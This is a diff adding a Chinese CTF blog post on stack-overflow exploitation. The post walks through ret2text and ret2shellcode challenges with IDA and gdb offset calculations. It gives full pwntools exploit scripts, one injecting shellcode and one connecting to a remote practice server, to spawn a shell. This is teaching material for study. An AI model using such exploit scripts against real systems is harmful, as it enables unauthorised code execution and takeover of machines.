@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/favicon.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="栈溢出网站：https:&#x2F;&#x2F;ctf-wiki.org&#x2F; 附言：所有的学习均在本地测试，远程可以使用socat或者docker部署">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Wiki之栈溢出">
+<meta property="og:url" content="http://example.com/2026/06/21/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="vi0let&#39;s blog">
+<meta property="og:description" content="栈溢出网站：https:&#x2F;&#x2F;ctf-wiki.org&#x2F; 附言：所有的学习均在本地测试，远程可以使用socat或者docker部署">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163235776.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163318074.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164235497.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164317442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164947894.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616165950043.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171527851.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171732498.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616190029416.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165203505.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616194848607.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617102809148.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105411878.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617105536928.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617112104732.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160518058.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617160816757.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161022248.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617161107749.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165348158.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617202842455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203134019.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203657889.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617203738980.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204005123.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204301525.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617205228929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617204730342.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210035884.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210220822.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210500398.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617212503114.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617210556495.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211320710.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211915506.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617211848614.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214054803.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617214223568.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/ret2libc2_01.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617224122737.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617221719649.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102115483.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102235365.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102436248.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618102526005.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125557365.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618125708159.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202733545.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618202819738.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210224594.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220618210302293.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220619213844860.png">
+<meta property="article:published_time" content="2026-06-21T05:24:36.367Z">
+<meta property="article:modified_time" content="2023-05-08T13:46:12.896Z">
+<meta property="article:author" content="vi0let">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png">
+
+
+<link rel="canonical" href="http://example.com/2026/06/21/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2026/06/21/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/","path":"2026/06/21/pwn/栈溢出/","title":"CTF-Wiki之栈溢出"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF-Wiki之栈溢出 | vi0let's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">vi0let's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">栈溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-number">2.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">3.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">4.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">5.</span> <span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B1"><span class="nav-number">5.1.</span> <span class="nav-text">例1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B2"><span class="nav-number">5.2.</span> <span class="nav-text">例2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B3"><span class="nav-number">5.3.</span> <span class="nav-text">例3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-number">6.</span> <span class="nav-text">ret2csu</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="vi0let"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">vi0let</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/06/21/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="vi0let">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="vi0let's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CTF-Wiki之栈溢出 | vi0let's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF-Wiki之栈溢出
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-21 13:24:36" itemprop="dateCreated datePublished" datetime="2026-06-21T13:24:36+08:00">2026-06-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-05-08 21:46:12" itemprop="dateModified" datetime="2023-05-08T21:46:12+08:00">2023-05-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>网站：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p>
+<p>附言：所有的学习均在本地测试，远程可以使用socat或者docker部署</p>
+<span id="more"></span>
+
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><strong>保护检查</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191107953.png" alt="image-20220615191107953"></p>
+<p>32位，开启NX保护。</p>
+<p>查看调用的函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615191201980.png" alt="image-20220615191201980"></p>
+<p>发现sysytem、printf、gets、puts等。</p>
+<p>ida打开看看(F5反汇编)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193317042.png" alt="image-20220615193317042"></p>
+<p>shift+f12查看字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615193542927.png" alt="image-20220615193542927"></p>
+<p>很明显，在主函数中，gets函数存在栈溢出，并且字符串中调用了&#x2F;bin&#x2F;sh，追踪发现secure调用了system(“&#x2F;bin&#x2F;sh”)，记录一下地址。</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615194305769.png" alt="image-20220615194305769" style="zoom:80%;" />
+
+<p>可以造成溢出的gets函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615200638390.png" alt="image-20220615200638390"></p>
+<p>需要计算s相对于返回地址的偏移，可以使用gdb动态调试得到，也可以直接利用ida给出的偏移值计算(这个方法在主函数使用时候经常是给出的偏移是错误的)</p>
+<p><strong>调试</strong></p>
+<p><strong>使用gdb动态调试：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2text			<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x080486AE	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行截图如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202027514.png" alt="image-20220615202027514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615202045907.png" alt="image-20220615202045907"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb动态调试计算偏移</span><br><span class="line">由图可知</span><br><span class="line">esp            0xffffcf20</span><br><span class="line">ebp            0xffffcfa8</span><br><span class="line">s=esp+1ch=ffffcf3c</span><br><span class="line">s相对于ebp偏移：offset=ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移(因为是32位，所以直接+4)：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数进行栈溢出，并且修改返回的地址</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试相关信息</span></span><br><span class="line"><span class="comment">#io=remote(&#x27;&#x27;,)										#远程访问，需要自己挂上去</span></span><br><span class="line">io=process(<span class="string">&#x27;./ret2text&#x27;</span>)							<span class="comment">#本地访问</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2text&#x27;)								#导入本地文件</span></span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)									<span class="comment">#计算的偏移，需要填充垃圾数据</span></span><br><span class="line">shellc=<span class="number">0x0804863A</span>									<span class="comment">#记录在ida找到的system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload=junk+p32(shellc)							<span class="comment">#构造payload</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送构造好的payload</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程进行交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220615204942903.png" alt="image-20220615204942903"></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p><strong>保护检查</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163235776.png" alt="image-20220616163235776" style="zoom:80%;" />
+
+<p>32位，没有开启保护，说明栈上可执行</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616163318074.png" alt="image-20220616163318074" style="zoom:80%;" />
+
+<p>可以看到一些经常利用的函数，如gets…</p>
+<p>ida打开看看</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164235497.png" alt="image-20220616164235497" style="zoom:80%;" />
+
+<p>可以造成溢出的gets函数(因为gets没有设置字符串长度)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164317442.png" alt="image-20220616164317442" style="zoom:80%;" />
+
+<p>看主函数，可以知道当输入完s(长度为100)后，使用strncpy把s的数据复制到buf2，因为buf2没有在主函数中设出来，所以应该是一个全局变量，未初始化的全局变量一般保存在bss段中，双击buf2变量，看一下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616164947894.png" alt="image-20220616164947894" style="zoom:80%;" />
+
+
+
+<p><strong>使用gdb调试看看</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2shellcode 		<span class="comment">#启动gdb</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b main			<span class="comment">#在主函数处下断点</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap			<span class="comment">#查看当前程序的系统调用库</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616165950043.png" alt="image-20220616165950043" style="zoom:80%;" />
+
+<p>由ida中的bss地址看到所属的区域(在第一行里)是具有可执行的权限的。</p>
+<p>通过主函数可以知道把s的数据复制到buf2这个可以执行的bss段上，复制的大小是0x64，0x64-0x1C&#x3D;0x48&#x3D;72，大小足够了，直接使用pwntools提供的函数即可，可以看一下pwntools中构造 shellcode的字符串长度</p>
+<p>这个是32位的shellc</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171527851.png" alt="image-20220616171527851" style="zoom:80%;" />
+
+<p>这个是64位的shellc</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616171732498.png" alt="image-20220616171732498" style="zoom:80%;" />
+
+<p>对于偏移的计算，跟上面的ret2text原理一样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ret2shellcode		<span class="comment">#使用gdb调试程序文件</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x08048593	<span class="comment">#在gets函数指向前下断点，地址是之前在ida中看到的</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; r				<span class="comment">#运行</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; info reg		<span class="comment">#显示寄存器的值，主要看的是esp和ebp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220616190029416.png" alt="image-20220616190029416" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">esp            0xffffcef0          </span><br><span class="line">ebp            0xffffcf78   </span><br><span class="line">s=esp+0x1c=ffffcf0c</span><br><span class="line">s相对于esp的偏移：ebp-s=0x6c</span><br><span class="line">=&gt;s相对于返回地址的偏移：0x6c+4</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>攻击思路</strong></p>
+<p>利用gets函数造成栈溢出修改返回地址为buf2的地址，在s中填充shellcode(需要填满，空余的用其他垃圾数据填充)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*									<span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)	<span class="comment">#调试的相关信息</span></span><br><span class="line">io=remote(<span class="string">&#x27;101.35.231.134&#x27;</span>,<span class="number">10000</span>)					<span class="comment">#远程访问</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)						#本地访问，这题不知道为啥打不通</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./ret2shellcode&#x27;)							#导入文件</span></span><br><span class="line"></span><br><span class="line">shellc=asm(shellcraft.sh())							<span class="comment">#调用系统函数自动生成</span></span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span>								<span class="comment">#buf2的地址，让返回地址修改为这个</span></span><br><span class="line"></span><br><span class="line">payload=shellc.ljust(<span class="number">0x6c</span>+<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)	<span class="comment">#构造payload</span></span><br><span class="line">io.sendline(payload)								<span class="comment">#发送</span></span><br><span class="line">io.interactive()									<span class="comment">#与远程交互</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20220617165203505.png" alt="image-20220617165203505" style="zoom:80%;" />
+
